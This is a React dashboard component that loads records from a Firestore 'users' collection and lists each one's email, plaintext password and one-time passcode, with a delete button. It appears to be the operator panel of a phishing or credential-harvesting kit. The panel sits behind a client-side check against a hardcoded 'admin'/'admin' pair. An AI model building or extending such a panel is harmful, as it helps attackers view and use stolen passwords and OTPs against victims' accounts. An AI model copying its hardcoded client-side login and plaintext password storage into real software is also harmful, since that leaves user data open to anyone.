import React, {useState, useEffect} from "react";
import db from "../../firebase";
import {collection,doc, deleteDoc, getDocs} from "firebase/firestore";

const Dashb = () => {
    const [users, setUsers] = useState([]);
    const [errors, setErrors] = useState("");//{email: "Email is required", password: "Password is required"}
    const [isLogged, setIsLogged] = useState(false);
    const deleteUser = async (id) => {
        await deleteDoc(doc(db, "users", id));
        const newUsers = users.filter((user) => user.id !== id);
        setUsers(newUsers);
    };
    const handleLogin = (e) => {
        e.preventDefault();
        //check if email is admin@admin and password is admin
        if (e.target.email.value === "admin" && e.target.password.value === "admin") {
            setIsLogged(true);
        }else{
            setErrors("Ooops Email or password is incorrect!!")
        }
    }

  useEffect(() => { 
    const getUsers = async () => {
      const data = await getDocs(collection(db, "users"));
      setUsers(data.docs.map((doc) => ({ ...doc.data(), id: doc.id })));
    };
    getUsers();
    }, [])
  return (
    <> 
        {isLogged ? (
            <div className="flex flex-col">
            <div className="overflow-x-auto sm:-mx-6 lg:-mx-8">
                <div className="py-2 align-middle inline-block min-w-full sm:px-6 lg:px-8">
                <div className="shadow overflow-hidden border-b border-gray-200">
                    <table className="min-w-full divide-y divide-gray-200">
                    <thead className="bg-gray-800 text-white">
                        <tr>
                        <th
                            scope="col"
                            className="px-6 py-3 text-left text-xs font-medium text-white uppercase tracking-wider"
                        >
                            Email
                        </th>
                        <th
                            scope="col"
                            className="px-6 py-3 text-left text-xs font-medium text-white uppercase tracking-wider"
                        >
                            Password
                        </th>
                        <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-white uppercase tracking-wider">
                            OTP
                        </th>
                        <th scope="col" className="relative px-6 py-3">
                            <span className="sr-only">Delete</span>
                        </th>
                        </tr>
                    </thead>
                    <tbody className="bg-white divide-y divide-gray-200">
                        {users.map((user) => (
                        <tr key={user.id}>
                            <td className="px-6 py-4 whitespace-nowrap">
                            <div className="flex items-center">
                                <div className="ml-4">
                                <div className="text-sm font-medium text-gray-900">{user.email}</div>
                                </div>
                            </div>
                            </td>
                            <td className="px-6 py-4 whitespace-nowrap">
                            <div className="text-sm text-gray-900">{user.password}</div>
                            </td>
                            <td className="px-6 py-4 whitespace-nowrap">
                            <span className="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-green-100 text-green-800">
                                {user.otp}
                            </span>
                            </td>
                            <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
                            <button
                                onClick={() => deleteUser(user.id)}
                                className="text-red-600 hover:text-indigo-900"
                            >
                                Delete
                            </button>
                            </td>
                        </tr>
                        ))}
                    </tbody>
                    </table>
                </div>
                </div>
            </div>
        </div>
        ):(
            <div className="flex flex-col">
                {/* login page */}
                <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
                    <div className="flex flex-col items-center justify-center w-full px-6 py-4 bg-white shadow-md sm:max-w-md">
                        <div className="text-3xl font-bold text-gray-700">Login</div>
                        <div className="mt-4">
                            {errors && <div className="text-red-500 mb-3">{errors}</div>}
                            <form action="#" onSubmit={handleLogin} autoComplete="off">
                            <div className="flex flex-col gap-4 mb-2">
                                <div className="flex relative ">
                                    <span className="rounded-l-md inline-flex items-center px-3 border-t bg-white border-l border-b  border-gray-300 text-gray-500 shadow-sm text-sm">
                                        <svg
                                            width="15"
                                            height="15"
                                            fill="currentColor"
                                            viewBox="0 0 1792 1792"
                                            xmlns="http://www.w3.org/2000/svg"
                                        >
                                            <path d="M640 704q0-53-37.5-90.5T512 576t-90.5 37.5T384 704t37.5 90.5T512 832t90.5-37.5T640 704zm768 192q0-159-112.5-271.5T1024 512H640q-159 0-271.5 112.5T256 896t112.5 271.5T640 1280h384q159 0 271.5-112.5T1408 896zM512 256q0-53-37.5-90.5T384 128t-90.5 37.5T256 256t37.5 90.5T384 384t90.5-37.5T512 256zm1152 768q0 159-112.5 271.5T1280 1408H896q-159 0-271.5-112.5T512 1024t112.5-271.5T896 640h384q159 0 271.5 112.5T1664 896z"></path>
                                        </svg>
                                    </span>
                                    <input
                                        type="text"
                                        name="email"
                                        className="rounded-r-md flex-1 appearance-none border border-gray-300 w-full py-2 px-4 bg-white text-gray-700 placeholder-gray-400 shadow-sm text-base focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:border-transparent"
                                        placeholder="Email"
                                    />
                                </div>
                                <div className="flex relative ">
                                    <span className="rounded-l-md inline-flex items-center px-3 border-t bg-white border-l border-b  border-gray-300 text-gray-500 shadow-sm text-sm">
                                        <svg
                                            width="15"
                                            height="15"
                                            fill="currentColor"
                                            viewBox="0 0 1792 1792"
                                            xmlns="http://www.w3.org/2000/svg"
                                        >
                                            <path d="M640 704q0-53-37.5-90.5T512 576t-90.5 37.5T384 704t37.5 90.5T512 832t90.5-37.5T640 704zm768 192q0-159-112.5-271.5T1024 512H640q-159 0-271.5 112.5T256 896t112.5 271.5T640 1280h384q159 0 271.5-112.5T1408 896zM512 256q0-53-37.5-90.5T384 128t-90.5 37.5T256 256t37.5 90.5T384 384t90.5-37.5T512 256zm1152 768q0 159-112.5 271.5T1280 1408H896q-159 0-271.5-112.5T512 1024t112.5-271.5T896 640h384q159 0 271.5 112.5T1664 896z"></path>
                                        </svg>
                                    </span>
                                    <input
                                        type="password"
                                        name="password"
                                        className="rounded-r-md flex-1 appearance-none border border-gray-300 w-full py-2 px-4 bg-white text-gray-700 placeholder-gray-400 shadow-sm text-base focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:border-transparent"
                                        placeholder="Password"
                                    />
                                </div>
                                    <button
                                        type="submit"
                                        className="px-4 py-2 rounded-md text-white bg-indigo-500 hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none"
                                    >
                                        Login
                                    </button>
                            </div>
                            </form>
                        </div>
                    </div>
                </div>

            </div>
        )}
    </>
  )
}

export default Dashb